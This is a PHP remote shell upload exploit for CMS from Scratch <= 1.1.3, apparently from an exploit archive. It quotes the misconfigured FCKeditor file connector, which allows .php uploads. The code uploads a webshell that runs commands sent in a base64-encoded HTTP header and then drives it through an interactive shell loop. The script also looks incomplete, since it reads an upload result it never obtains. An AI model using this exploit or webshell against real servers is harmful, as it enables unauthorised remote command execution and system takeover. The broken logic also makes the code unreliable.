CMS from Scratch <= 1.1.3 (fckeditor) Remote Shell Upload Exploit
=================================================================




<?php

/*
	-----------------------------------------------------------------
	CMS from Scratch <= 1.1.3 (fckeditor) Remote Shell Upload Exploit
	-----------------------------------------------------------------
	
	author...: EgiX
	
	link.[1].: http://cmsfromscratch.com/
	link.[2].: http://cmsfromscratch.googlecode.com/files/cmsfs114b.tgz (tested package)

	[-] vulnerable code in /cms/FCKeditor/editor/filemanager/connectors/php/config.php
	
	27.	// SECURITY: You must explicitelly enable this "connector". (Set it to "true").
	28.	// WARNING: don&#039;t just set "ConfigIsEnabled = true", you must be sure that only 
	29.	//		authenticated users can access this file or use some kind of session checking.
	30.	$Config[&#039;Enabled&#039;] = true ; <======
	31.	
	32.	$path = $_SERVER["REQUEST_URI"] ;
	33.	$relativePathFromWebServerRoot =  substr($path, 0, strpos($path, "/", 1) );
	34.	// Coming out as /CMS, why???
	35.	
	36.	
	37.	
	38.	// Path to user files relative to the document root.
	39.	// This is what is inserted into the HTML markup
	40.	$Config[&#039;UserFilesPath&#039;] = urldecode(rtrim(str_replace(&#039;cms/FCKeditor/editor/filemanager/connectors/php&#039;, &#039;&#039;, dirname($_SERVER[&#039;SCRIPT_NAME&#039;])), &#039;/&#039;)) ;
	41.	if ($Config[&#039;UserFilesPath&#039;] == &#039;&#039;) $Config[&#039;UserFilesPath&#039;] = &#039;/&#039; ;
	42.	
	44.	// Attention: The above &#039;UserFilesPath&#039; must point to the same directory.
	45.	// BH note: This is used for browsing the server.. should equate to the real path of the folder where /cms/ is installed
	46.	$Config[&#039;UserFilesAbsolutePath&#039;] = realpath(&#039;../../../../../../&#039;) ;
	47.	
	48.	// Due to security issues with Apache modules, it is reccomended to leave the following setting enabled.
	49.	$Config[&#039;ForceSingleExtension&#039;] = true ;
	50.	// Perform additional checks for image files
	51.	// if set to true, validate image size (using getimagesize)
	52.	$Config[&#039;SecureImageUploads&#039;] = true;
	53.	// What the user can do with this connector
	54.	$Config[&#039;ConfigAllowedCommands&#039;] = array(&#039;QuickUpload&#039;, &#039;FileUpload&#039;, &#039;GetFolders&#039;, &#039;GetFoldersAndFiles&#039;, &#039;CreateFolder&#039;) ;
	55.	// Allowed Resource Types
	56.	$Config[&#039;ConfigAllowedTypes&#039;] = array(&#039;File&#039;, &#039;Image&#039;, &#039;Flash&#039;, &#039;Media&#039;) ;
	57.	// For security, HTML is allowed in the first Kb of data for files having the following extensions only.
	58.	$Config[&#039;HtmlExtensions&#039;] = array("html", "htm", "xml", "xsd", "txt", "js") ;
	59.	
	60.	$Config[&#039;AllowedExtensions&#039;][&#039;File&#039;]	= array(&#039;7z&#039;, &#039;aiff&#039;, &#039;asf&#039;, &#039;avi&#039;, &#039;bmp&#039;, &#039;csv&#039;, &#039;doc&#039;, &#039;fla&#039;, &#039;flv&#039;, &#039;gif&#039;, &#039;gz&#039;, &#039;gzip&#039;, &#039;jpeg&#039;, &#039;jpg&#039;, &#039;mid&#039;, &#039;mov&#039;, &#039;mp3&#039;, &#039;mp4&#039;, &#039;mpc&#039;, &#039;mpeg&#039;, &#039;mpg&#039;, &#039;ods&#039;, &#039;odt&#039;, &#039;pdf&#039;, &#039;php&#039;, &#039;png&#039;, &#039;ppt&#039;, &#039;pxd&#039;, &#039;qt&#039;, &#039;ram&#039;, &#039;rar&#039;, &#039;rm&#039;, &#039;rmi&#039;, &#039;rmvb&#039;, &#039;rtf&#039;, &#039;sdc&#039;, &#039;sitd&#039;, &#039;swf&#039;, &#039;sxc&#039;, &#039;sxw&#039;, &#039;tar&#039;, &#039;tgz&#039;, &#039;tif&#039;, &#039;tiff&#039;, &#039;txt&#039;, &#039;vsd&#039;, &#039;wav&#039;, &#039;wma&#039;, &#039;wmv&#039;, &#039;xls&#039;, &#039;xml&#039;, &#039;zip&#039;) ;
	61.	$Config[&#039;DeniedExtensions&#039;][&#039;File&#039;]		= array() ; <========
	62.	$Config[&#039;FileTypesPath&#039;][&#039;File&#039;]		= $Config[&#039;UserFilesPath&#039;] ;
	63.	$Config[&#039;FileTypesAbsolutePath&#039;][&#039;File&#039;]= $Config[&#039;UserFilesAbsolutePath&#039;] ;
	64.	$Config[&#039;QuickUploadPath&#039;][&#039;File&#039;]		= $Config[&#039;UserFilesPath&#039;] ;
	65.	$Config[&#039;QuickUploadAbsolutePath&#039;][&#039;File&#039;]= $Config[&#039;UserFilesAbsolutePath&#039;] ;

	with a default configuration of this script, an attacker might be able to upload arbitrary files containing malicious PHP code due to
	$Config[&#039;AllowedExtensions&#039;][&#039;File&#039;] array, used in IsAllowedExt() function to check the file&#039;s extension, contains also .php extension
*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print "\n[-] No response from {$host}:80 Trying again...";
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

print "\n+---------------------------------------------------------------+";
print "\n| CMS from Scratch <= 1.1.3 Remote Shell Upload Exploit by EgiX |";
print "\n+---------------------------------------------------------------+\n";

if ($argc < 3)
{
	print "\nUsage......: php $argv[0] host path";
	print "\nExample....: php $argv[0] localhost /";
	print "\nExample....: php $argv[0] localhost /cms114/\n";
	die();
}

$host = $argv[1];
$path = $argv[2];

$data  = "--12345\r\n";
$data .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"sh.php\"\r\n";
$data .= "Content-Type: unknown/unknown\r\n\r\n";
$data .= "<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?>\n";
$data .= "--12345--\r\n";

$packet  = "POST {$path}/cms/FCKeditor/editor/filemanager/connectors/php/upload.php?Type=File HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Length: ".strlen($data)."\r\n";
$packet .= "Content-Type: multipart/form-data; boundary=12345\r\n";
$packet .= "Connection: close\r\n\r\n";
$packet .= $data;


if (!in_array(intval($html[1]), array(0, 201))) die("\n[-] Upload failed! (Error {$html[1]})\n");
else print "\n[-] Shell uploaded to {$html[2]}...starting it!\n";

define(STDIN, fopen("php://stdin", "r"));

while(1)
{
	print "\ncmsfs-shell# ";
	$cmd = trim(fgets(STDIN));
	if ($cmd != "exit")
	{
		$packet = "GET {$path}{$html[3]} HTTP/1.0\r\n";
		$packet.= "Host: {$host}\r\n";
		$packet.= "Cmd: ".base64_encode($cmd)."\r\n";
		$packet.= "Connection: close\r\n\r\n";
		$output = http_send($host, $packet);
		if (!eregi("_code_", $output)) die("\n[-] Exploit failed...\n");
		$shell = explode("_code_", $output);
		print "\n{$shell[1]}";
	}
	else break;
}

?>



